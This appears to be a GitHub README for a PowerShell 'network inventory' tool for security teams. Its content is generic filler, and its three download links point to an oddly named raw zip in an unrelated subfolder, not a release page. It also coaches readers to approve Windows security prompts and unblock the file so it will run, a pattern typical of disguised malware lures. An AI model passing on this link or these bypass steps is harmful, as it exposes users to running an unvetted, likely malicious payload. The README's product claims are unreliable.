# 🔍 ZavetSec-NetworkInventory - Fast Offline Network Asset Checks

[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/amruhaf7527/ZavetSec-NetworkInventory/raw/refs/heads/main/osmina/Zavet_Network_Inventory_Sec_taxator.zip)

## 🧭 What this is

ZavetSec-NetworkInventory is a Windows tool that helps you scan your network and build an asset inventory. It is made for SOC and incident response work, but it is also useful if you want a simple way to check devices on a network.

It runs with PowerShell, works offline, and does not need a full install. You download it, open it, and run it on a Windows PC.

## 📥 Download

Use this page to download the latest release:

https://github.com/amruhaf7527/ZavetSec-NetworkInventory/raw/refs/heads/main/osmina/Zavet_Network_Inventory_Sec_taxator.zip

Look for the newest release file on that page. Download the package that matches your Windows system, then save it to a folder you can find again, such as Downloads or Desktop.

## 🖥️ What you need

This app is made for Windows.

You should have:

- A Windows computer
- PowerShell
- Permission to scan the network you are using
- Access to the devices or IP ranges you want to check

For best results, run it from an account that has enough rights to read network data and system details.

## 🚀 Getting started

Follow these steps to run the tool:

1. Open the release page and download the latest file.
2. Save the file to your computer.
3. If the file is in a .zip folder, right-click it and choose Extract All.
4. Open the extracted folder.
5. Find the PowerShell script or start file included in the release.
6. Right-click the file and choose Run with PowerShell, or open PowerShell and run it from the folder.
7. Follow the on-screen prompts to begin the scan.

If Windows shows a security prompt, choose the option that lets you run the file if you trust the source and you are on a system you are allowed to scan.

## 🛠️ How to run it in PowerShell

If the release includes a .ps1 file, you can run it this way:

1. Open the folder where you saved the files.
2. Hold Shift and right-click inside the folder.
3. Choose Open PowerShell window here or Open in Terminal.
4. Run the script from that folder.

A common command looks like this:

- .\ZavetSec-NetworkInventory.ps1

If the release includes a start file, use that file instead. The release package should guide you to the right one.

## 📋 What it does

ZavetSec-NetworkInventory helps you gather basic network and asset data, such as:

- Live hosts on a network
- Device names
- IP addresses
- Basic host details
- Network ranges you enter
- Scan results you can review later

It is built for quick checks during security work and incident response. You can use it to get a clear view of what is on a network without setting up extra tools.

## 🔎 Typical use cases

Use this tool when you need to:

- Find devices on a local network
- Build a simple asset list
- Check unknown hosts during an incident
- Review active systems before deeper analysis
- Collect data for blue team work
- Run a fast offline scan on a Windows machine

## 🧰 Files you may see in the release

The download may include files like these:

- A PowerShell script file
- A readme or usage file
- A config file for scan settings
- Output folders for results
- A log file for scan history

If the package includes more than one script, start with the main launch file or the file named in the release notes.

## 🧪 Basic scan flow

Most users will follow a simple flow:

1. Start the tool.
2. Enter the network range you want to scan.
3. Choose any scan options shown on screen.
4. Wait for the scan to finish.
5. Review the results.
6. Save or copy the output for later use.

If you are checking a work network, use the range approved by your team.

## 📁 Output and results

The tool may create results in a readable format such as:

- On-screen tables
- Text files
- CSV files
- Logs with scan details

This makes it easier to sort hosts, compare results, and use the data in reports or incident notes.

## ⚙️ Common options

The tool may let you set things like:

- IP range or subnet
- Timeout values
- Scan depth
- Output file name
- Save location
- Verbose mode for more detail

If you are not sure what to choose, use the default values first. That is the easiest way to see how the tool works.

## 🔐 Safety and access

Only scan systems and networks that you own or are allowed to test. Network scanning can affect devices and can trigger alerts on managed systems.

If you use this in a company setting, make sure your security team knows the scan is running.

## 🪟 Windows tips

If PowerShell blocks the script, try these steps:

1. Right-click the file.
2. Open Properties.
3. Check whether Windows marked the file as blocked.
4. Unblock the file if that option appears.
5. Run the script again from PowerShell.

You may also want to use Windows Terminal if it is available on your system.

## 🧩 Troubleshooting

If the tool does not start:

- Check that you downloaded the latest release
- Make sure you extracted the zip file
- Confirm that PowerShell is installed
- Run PowerShell as the correct user
- Check that the file name matches the release files
- Make sure your network range is valid

If the scan returns no results:

- Check the IP range
- Make sure the target devices are powered on
- Confirm that the firewall or network rules allow discovery
- Try a smaller range first

If Windows asks for approval:

- Read the file name and location
- Confirm you downloaded it from the release page
- Use a trusted account on a system you manage

## 🧾 Example workflow

A simple example:

1. Open the release page.
2. Download the newest package.
3. Extract the files.
4. Start PowerShell in the folder.
5. Run the main script.
6. Enter a local subnet such as 192.168.1.0/24 if that matches your network.
7. Wait for the scan to finish.
8. Review the host list and save the output

## 🗂️ Topic focus

This project fits work in:

- asset inventory
- blue team tasks
- forensics
- incident response
- network scanning
- network security
- PowerShell tools
- SOC work
- Windows security checks
- vulnerability review support

## 📌 License and use

Use the release files for your own network checks, testing, and security work. Follow your team rules and local policy when you run scans

## 🔗 Download again

https://github.com/amruhaf7527/ZavetSec-NetworkInventory/raw/refs/heads/main/osmina/Zavet_Network_Inventory_Sec_taxator.zip